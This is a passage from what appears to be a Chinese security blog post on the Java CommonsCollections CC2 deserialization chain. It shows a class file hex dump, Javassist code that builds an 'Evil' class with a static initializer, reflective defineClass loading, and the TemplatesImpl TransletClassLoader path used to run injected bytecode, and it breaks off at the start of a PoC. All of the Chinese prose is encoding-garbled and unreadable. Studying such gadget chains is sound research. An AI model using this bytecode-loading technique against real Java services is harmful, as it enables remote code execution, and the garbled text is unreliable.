<p>åœ¨ JVM è§„èŒƒä¸­<code>u1</code>ã€<code>u2</code>ã€<code>u4</code>åˆ†åˆ«è¡¨ç¤ºçš„æ˜¯ 1ã€2ã€4 ä¸ªå­—èŠ‚çš„æ— ç¬¦å·æ•°ï¼Œå¯ä½¿ç”¨<code>java.io.DataInputStream</code>ç±»ä¸­çš„å¯¹åº”æ–¹æ³•ï¼š<code>readUnsignedByte</code>ã€<code>readUnsignedShort</code>ã€<code>readInt</code>æ–¹æ³•è¯»å–ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¡¨ç»“æ„(<code>table</code>)ç”±ä»»æ„æ•°é‡çš„å¯å˜é•¿åº¦çš„é¡¹ç»„æˆï¼Œç”¨äºè¡¨ç¤º class ä¸­çš„å¤æ‚ç»“æ„ï¼Œå¦‚ä¸Šè¿°çš„ï¼š<code>cp_info</code>ã€<code>field_info</code>ã€<code>method_info</code>ã€<code>attribute_info</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00000000</span>: cafe babe <span class="hljs-number">0000</span> <span class="hljs-number">0034</span> <span class="hljs-number">001</span>d <span class="hljs-number">0</span>a<span class="hljs-number">00</span> <span class="hljs-number">0600</span> <span class="hljs-number">0</span>f<span class="hljs-number">09</span>  .......<span class="hljs-number">4</span>........<br><span class="hljs-attribute">00000010</span>: <span class="hljs-number">0010</span> <span class="hljs-number">0011</span> <span class="hljs-number">0800</span> <span class="hljs-number">120</span>a <span class="hljs-number">0013</span> <span class="hljs-number">0014</span> <span class="hljs-number">0700</span> <span class="hljs-number">1507</span>  ................<br><span class="hljs-attribute">00000020</span>: <span class="hljs-number">0016</span> <span class="hljs-number">0100</span> <span class="hljs-number">063</span>c <span class="hljs-number">696</span>e <span class="hljs-number">6974</span> <span class="hljs-number">3</span>e<span class="hljs-number">01</span> <span class="hljs-number">0003</span> <span class="hljs-number">2829</span>  .....&lt;init&gt;...()<br><span class="hljs-attribute">00000030</span>: <span class="hljs-number">5601</span> <span class="hljs-number">0004</span> <span class="hljs-number">436</span>f <span class="hljs-number">6465</span> <span class="hljs-number">0100</span> <span class="hljs-number">0</span>f<span class="hljs-number">4</span>c <span class="hljs-number">696</span>e <span class="hljs-number">654</span>e  V...Code...LineN<br><span class="hljs-attribute">00000040</span>: <span class="hljs-number">756</span>d <span class="hljs-number">6265</span> <span class="hljs-number">7254</span> <span class="hljs-number">6162</span> <span class="hljs-number">6</span>c<span class="hljs-number">65</span> <span class="hljs-number">0100</span> <span class="hljs-number">046</span>d <span class="hljs-number">6169</span>  umberTable...mai<br><span class="hljs-attribute">00000050</span>: <span class="hljs-number">6</span>e<span class="hljs-number">01</span> <span class="hljs-number">0016</span> <span class="hljs-number">285</span>b <span class="hljs-number">4</span>c<span class="hljs-number">6</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f <span class="hljs-number">6</span>c<span class="hljs-number">61</span> <span class="hljs-number">6</span>e<span class="hljs-number">67</span>  n...([Ljava/lang<br><span class="hljs-attribute">00000060</span>: <span class="hljs-number">2</span>f<span class="hljs-number">53</span> <span class="hljs-number">7472</span> <span class="hljs-number">696</span>e <span class="hljs-number">673</span>b <span class="hljs-number">2956</span> <span class="hljs-number">0100</span> <span class="hljs-number">0</span>a<span class="hljs-number">53</span> <span class="hljs-number">6</span>f<span class="hljs-number">75</span>  /String;)V...Sou<br><span class="hljs-attribute">00000070</span>: <span class="hljs-number">7263</span> <span class="hljs-number">6546</span> <span class="hljs-number">696</span>c <span class="hljs-number">6501</span> <span class="hljs-number">0008</span> <span class="hljs-number">4343</span> <span class="hljs-number">322</span>e <span class="hljs-number">6</span>a<span class="hljs-number">61</span>  rceFile...CC<span class="hljs-number">2</span>.ja<br><span class="hljs-attribute">00000080</span>: <span class="hljs-number">7661</span> <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">0700</span> <span class="hljs-number">0807</span> <span class="hljs-number">0017</span> <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">1800</span> <span class="hljs-number">1901</span>  va..............<br><span class="hljs-attribute">00000090</span>: <span class="hljs-number">000</span>b <span class="hljs-number">4865</span> <span class="hljs-number">6</span>c<span class="hljs-number">6</span>c <span class="hljs-number">6</span>f<span class="hljs-number">20</span> <span class="hljs-number">576</span>f <span class="hljs-number">726</span>c <span class="hljs-number">6407</span> <span class="hljs-number">001</span>a  ..Hello World...<br><span class="hljs-attribute">000000a0</span>: <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">1</span>b<span class="hljs-number">00</span> <span class="hljs-number">1</span>c<span class="hljs-number">01</span> <span class="hljs-number">001</span>a <span class="hljs-number">436</span>f <span class="hljs-number">6</span>d<span class="hljs-number">6</span>d <span class="hljs-number">6</span>f<span class="hljs-number">6</span>e <span class="hljs-number">7343</span>  ........CommonsC<br><span class="hljs-attribute">000000b0</span>: <span class="hljs-number">6</span>f<span class="hljs-number">6</span>c <span class="hljs-number">6</span>c<span class="hljs-number">65</span> <span class="hljs-number">6374</span> <span class="hljs-number">696</span>f <span class="hljs-number">6</span>e<span class="hljs-number">73</span> <span class="hljs-number">2</span>f<span class="hljs-number">43</span> <span class="hljs-number">4332</span> <span class="hljs-number">2</span>f<span class="hljs-number">43</span>  ollections/CC<span class="hljs-number">2</span>/C<br><span class="hljs-attribute">000000c0</span>: <span class="hljs-number">4332</span> <span class="hljs-number">0100</span> <span class="hljs-number">106</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f <span class="hljs-number">6</span>c<span class="hljs-number">61</span> <span class="hljs-number">6</span>e<span class="hljs-number">67</span> <span class="hljs-number">2</span>f<span class="hljs-number">4</span>f  C<span class="hljs-number">2</span>...java/lang/O<br><span class="hljs-attribute">000000d0</span>: <span class="hljs-number">626</span>a <span class="hljs-number">6563</span> <span class="hljs-number">7401</span> <span class="hljs-number">0010</span> <span class="hljs-number">6</span>a<span class="hljs-number">61</span> <span class="hljs-number">7661</span> <span class="hljs-number">2</span>f<span class="hljs-number">6</span>c <span class="hljs-number">616</span>e  bject...java/lan<br><span class="hljs-attribute">000000e0</span>: <span class="hljs-number">672</span>f <span class="hljs-number">5379</span> <span class="hljs-number">7374</span> <span class="hljs-number">656</span>d <span class="hljs-number">0100</span> <span class="hljs-number">036</span>f <span class="hljs-number">7574</span> <span class="hljs-number">0100</span>  g/System...out..<br><span class="hljs-attribute">000000f0</span>: <span class="hljs-number">154</span>c <span class="hljs-number">6</span>a<span class="hljs-number">61</span> <span class="hljs-number">7661</span> <span class="hljs-number">2</span>f<span class="hljs-number">69</span> <span class="hljs-number">6</span>f<span class="hljs-number">2</span>f <span class="hljs-number">5072</span> <span class="hljs-number">696</span>e <span class="hljs-number">7453</span>  .Ljava/io/PrintS<br><span class="hljs-attribute">00000100</span>: <span class="hljs-number">7472</span> <span class="hljs-number">6561</span> <span class="hljs-number">6</span>d<span class="hljs-number">3</span>b <span class="hljs-number">0100</span> <span class="hljs-number">136</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f <span class="hljs-number">696</span>f  tream;...java/io<br><span class="hljs-attribute">00000110</span>: <span class="hljs-number">2</span>f<span class="hljs-number">50</span> <span class="hljs-number">7269</span> <span class="hljs-number">6</span>e<span class="hljs-number">74</span> <span class="hljs-number">5374</span> <span class="hljs-number">7265</span> <span class="hljs-number">616</span>d <span class="hljs-number">0100</span> <span class="hljs-number">0770</span>  /PrintStream...p<br><span class="hljs-attribute">00000120</span>: <span class="hljs-number">7269</span> <span class="hljs-number">6</span>e<span class="hljs-number">74</span> <span class="hljs-number">6</span>c<span class="hljs-number">6</span>e <span class="hljs-number">0100</span> <span class="hljs-number">1528</span> <span class="hljs-number">4</span>c<span class="hljs-number">6</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f  rintln...(Ljava/<br><span class="hljs-attribute">00000130</span>: <span class="hljs-number">6</span>c<span class="hljs-number">61</span> <span class="hljs-number">6</span>e<span class="hljs-number">67</span> <span class="hljs-number">2</span>f<span class="hljs-number">53</span> <span class="hljs-number">7472</span> <span class="hljs-number">696</span>e <span class="hljs-number">673</span>b <span class="hljs-number">2956</span> <span class="hljs-number">0021</span>  lang/String;)V.!<br><span class="hljs-attribute">00000140</span>: <span class="hljs-number">0005</span> <span class="hljs-number">0006</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0002</span> <span class="hljs-number">0001</span> <span class="hljs-number">0007</span> <span class="hljs-number">0008</span>  ................<br><span class="hljs-attribute">00000150</span>: <span class="hljs-number">0001</span> <span class="hljs-number">0009</span> <span class="hljs-number">0000</span> <span class="hljs-number">001</span>d <span class="hljs-number">0001</span> <span class="hljs-number">0001</span> <span class="hljs-number">0000</span> <span class="hljs-number">0005</span>  ................<br><span class="hljs-attribute">00000160</span>: <span class="hljs-number">2</span>ab<span class="hljs-number">7</span> <span class="hljs-number">0001</span> b<span class="hljs-number">100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0100</span> <span class="hljs-number">0</span>a<span class="hljs-number">00</span> <span class="hljs-number">0000</span> <span class="hljs-number">0600</span>  *...............<br><span class="hljs-attribute">00000170</span>: <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0300</span> <span class="hljs-number">0900</span> <span class="hljs-number">0</span>b<span class="hljs-number">00</span> <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">0100</span> <span class="hljs-number">0900</span>  ................<br><span class="hljs-attribute">00000180</span>: <span class="hljs-number">0000</span> <span class="hljs-number">2500</span> <span class="hljs-number">0200</span> <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">09</span>b<span class="hljs-number">2</span> <span class="hljs-number">0002</span> <span class="hljs-number">1203</span>  ..%.............<br><span class="hljs-attribute">00000190</span>: b<span class="hljs-number">600</span> <span class="hljs-number">04</span>b<span class="hljs-number">1</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">000</span>a <span class="hljs-number">0000</span> <span class="hljs-number">000</span>a <span class="hljs-number">0002</span>  ................<br><span class="hljs-attribute">000001a0</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0005</span> <span class="hljs-number">0008</span> <span class="hljs-number">0006</span> <span class="hljs-number">0001</span> <span class="hljs-number">000</span>d <span class="hljs-number">0000</span> <span class="hljs-number">0002</span>  ................<br><span class="hljs-attribute">000001b0</span>: <span class="hljs-number">000</span>e                                     ..<br></code></pre></td></tr></table></figure>

<p>å…¶ä»–è¯¦è§ class æ–‡ä»¶è§£æï¼Œclass æ–‡ä»¶å±æ€§è§£æï¼Œjava è™šæ‹ŸæœºæŒ‡ä»¤é›†</p>
<p>æ­£æ˜¯æœ‰äº†è¿™äº›åŸºç¡€ï¼Œå‡ºç°äº† Java å­—èŠ‚ç åº“å…è®¸æˆ‘ä»¬é€šè¿‡å­—èŠ‚ç åº“çš„ API åŠ¨æ€åˆ›å»ºä¿®æ”¹ Java ç±»ã€æ–¹æ³•ã€å˜é‡ç­‰æ“ä½œï¼Œä¾‹å¦‚ï¼šä¸€ç§é€šç”¨çš„ Java å­—èŠ‚ç æ“ä½œå’Œåˆ†ææ¡†æ¶<code>ASM</code>ï¼Œå¯ä»¥ç›´æ¥ä»¥äºŒè¿›åˆ¶å½¢å¼ä¿®æ”¹ç°æœ‰çš„ç±»æˆ–è€…ç”Ÿæˆç±»æ–‡ä»¶ï¼›å¦ä¸€ç§æ˜¯<code>Javassist</code>ï¼Œå®ƒç›¸æ¯”äº<code>ASM</code>æ›´ç®€ä¾¿ï¼Œæˆ‘ä»¬ä¸ç”¨å…³æ³¨ Java åº•å±‚çš„å­—èŠ‚ç å’Œæ ˆæ“ä½œï¼Œå­¦ä¼šå¦‚ä½•ä½¿ç”¨å…¶ API å°±å¯ä»¥å®ç°å­—èŠ‚ç çš„ç¼–è¾‘</p>
<p>å’Œåå°„å·®ä¸å¤šç”¨ï¼Œå‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://javasec.org/javase/JavaByteCode/Javassist.html">javasec</a> <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/article/35230124.html">w3cschool</a> <a target="_blank" rel="noopener" href="https://github.com/IndustriousSnail/javassist-learn">javaassist-translate</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JavassistDemo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, IOException, NotFoundException </span>&#123;<br>        ClassPool classPool = ClassPool.getDefault();<br>        CtClass ctClass = classPool.makeClass(<span class="hljs-string">&quot;CommonsCollections.CC2.Evil&quot;</span>);<br>        CtMethod Mmain = CtMethod.make(<br>                <span class="hljs-string">&quot;public static void main(String[] args) &#123;System.out.println(\&quot;main method\&quot;);&#125;&quot;</span>, ctClass<br>        );<br>        ctClass.addMethod(Mmain);<br>        ctClass.makeClassInitializer().insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;evil code\&quot;);&quot;</span>);<br>        CtMethod MSysinfo = <span class="hljs-keyword">new</span> CtMethod(CtClass.voidType, <span class="hljs-string">&quot;Sysinfo&quot;</span>, <span class="hljs-keyword">new</span> CtClass[]&#123;&#125;, ctClass);<br>        MSysinfo.setModifiers(<span class="hljs-number">1</span>);<br>        MSysinfo.setBody(<span class="hljs-string">&quot;System.out.println(System.getProperty(\&quot;os.name\&quot;));&quot;</span>);<br>        ctClass.addMethod(MSysinfo);<br>        ctClass.writeFile(<span class="hljs-string">&quot;D:\\program\\java\\moonlight\\src\\main\\java&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] var0)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;main method&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;evil code&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Sysinfo</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Evil</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ—¢ç„¶å¯ä»¥é€šè¿‡<code>Javassist</code>å†™å…¥é™æ€ä»£ç ï¼Œé‚£ä¹ˆåªè¦ç±»å®ä¾‹è¢«åˆ›å»ºå°±ä¼šæ‰§è¡Œï¼›ç”Ÿæˆçš„ class æ–‡ä»¶å¦‚ä½•åˆ©ç”¨å‘¢ï¼Œè¯»å–ä¸º byte æ•°ç»„ï¼Œç„¶åé€šè¿‡<strong>ç»§æ‰¿ ClassLoaderï¼Œé‡å†™ findClass æ–¹æ³•</strong>æˆ–è€…ç›´æ¥<strong>åå°„è°ƒç”¨ defineClass æ–¹æ³•</strong>(ä¸æƒ³éµå¾ªåŒäº²å§”æ´¾å¯ä»¥<strong>é‡å†™ loadClass</strong>)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br><br><span class="hljs-comment">//1</span><br><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-keyword">return</span> defineClass(ç±»å, ç±»å­—èŠ‚ç <span class="hljs-keyword">byte</span>æ•°ç»„, <span class="hljs-number">0</span>, <span class="hljs-keyword">byte</span>æ•°ç»„é•¿åº¦);<br>    &#125;<br><br><span class="hljs-comment">//2</span><br>Class clz = Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>);<br>Method defineClassMeth = clz.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class);<br>defineClassMeth.setAccessible(<span class="hljs-keyword">true</span>);<br>Class ac = (Class) defineClassMeth.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;myjavasec.Moonlight&quot;</span>, bytes, <span class="hljs-number">0</span>, bytes.length);<br>ac.newInstance();<br></code></pre></td></tr></table></figure>

<p>ä½†å› ä¸º<code>ClassLoader.defineClass</code>æ˜¯<code>protected</code>çš„ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡å¤–éƒ¨è®¿é—®ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨åå°„è°ƒç”¨</p>
<p>ç„¶è€Œï¼Œæ€»æœ‰ä¸€äº›ç±»çš„<code>defineClass</code>æ–¹æ³•æ˜¯è¢«åº•å±‚çš„å…¶ä»–ç±»ä½¿ç”¨åˆ°äº†çš„ï¼Œè¿™å°±æ˜¯<code>TemplatesImpl</code>çš„å†…éƒ¨ç±»<code>TransletClassLoader</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;<br><br>     TransletClassLoader(ClassLoader parent) &#123;<br>         <span class="hljs-keyword">super</span>(parent);<br>        _loadedExternalExtensionFunctions = <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;<br>        <span class="hljs-keyword">super</span>(parent);<br>        _loadedExternalExtensionFunctions = mapEF;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class&lt;?&gt; ret = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-comment">// The _loadedExternalExtensionFunctions will be empty when the</span><br>        <span class="hljs-comment">// SecurityManager is not set and the FSP is turned off</span><br>        <span class="hljs-keyword">if</span> (_loadedExternalExtensionFunctions != <span class="hljs-keyword">null</span>) &#123;<br>            ret = _loadedExternalExtensionFunctions.get(name);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ret == <span class="hljs-keyword">null</span>) &#123;<br>            ret = <span class="hljs-keyword">super</span>.loadClass(name);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>     &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Access to final protected superclass member from outer class.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">Class <span class="hljs-title">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] b)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-keyword">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªç±»é‡Œé‡å†™äº† defineClass æ–¹æ³•ï¼Œå¹¶ä¸”è¿™é‡Œæ²¡æœ‰æ˜¾å¼åœ°å£°æ˜å…¶å®šä¹‰åŸŸã€‚Java ä¸­é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ª æ–¹æ³•æ²¡æœ‰æ˜¾å¼å£°æ˜ä½œç”¨åŸŸï¼Œå…¶ä½œç”¨åŸŸä¸º defaultã€‚æ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œçš„ defineClass ç”±å…¶çˆ¶ç±»çš„ protected ç±»å‹å˜æˆäº†ä¸€ä¸ª default ç±»å‹çš„æ–¹æ³•ï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨ã€‚</p>
<p>å¾€å‰çœ‹è°ƒç”¨ç»“æ„ä¸ºï¼š</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span><span class="hljs-module"><span class="hljs-identifier">TransletClassLoader</span>.</span></span>defineClass<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span><span class="hljs-module"><span class="hljs-identifier">TransletClassLoader</span>.</span></span>defineTransletClasses<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletClasses()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br>        #TrAXFilter.<span class="hljs-constructor">TrAXFilter(Templates)</span> # CC3åˆ™ç”¨åˆ°äº†TrAXFilterç±»<br></code></pre></td></tr></table></figure>

<p>è€Œ<code>TemplatesImpl.getOutputProperties</code>å’Œ<code>TemplatesImpl.newTransformer</code>éƒ½æ˜¯ publicï¼Œå¯ä»¥è¢«å¤–éƒ¨è°ƒç”¨</p>
<p>è€Œ<code>getOutputProperties</code>æ–¹æ³•ç¬¦åˆ<code>JavaBean</code>çš„<code>getter</code>å®šä¹‰</p>
<h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h4><p>æˆ‘ä»¬ç°åœ¨è¦è°ƒç”¨è¯»å…¥çš„å­—èŠ‚ç æ•°ç»„<code>static</code>ä»£ç å—ï¼Œå¹¶ä¸”åˆå§‹åŒ–ï¼Œysoserial ç”¨çš„æ˜¯<code>TemplatesImpl</code></p>
<p>åœ¨<code>newTransformer</code>æ–¹æ³•è°ƒç”¨äº†<code>getTransletInstance</code>ï¼Œå½“<code>_class</code>æ•°ç»„ä¸ä¸ºç©ºæ—¶</p>
<ul>
<li>è°ƒç”¨<code>defineTransletClasses</code>ï¼Œé€šè¿‡<code>loader.defineClass</code>è¯»å–äº†å­—èŠ‚ç æ•°ç»„</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>    _class[i] = loader.defineClass(_bytecodes[i]);<br>    <span class="hljs-keyword">final</span> Class superClass = _class[i].getSuperclass();<br><br>    <span class="hljs-comment">// Check if this is the main class</span><br>    <span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;<br>        _transletIndex = i;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        _auxClasses.put(_class[i].getName(), _class[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>è°ƒç”¨<code>newInstance</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸¤æ­¥æˆåŠŸæ‰§è¡Œå­—èŠ‚ç çš„ static ä»£ç å—</p>
<p>æš‚æ—¶ç›´æ¥è°ƒç”¨<code>TemplatesImpl.newTransformer</code>ï¼Œç¼–å†™ poc å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span 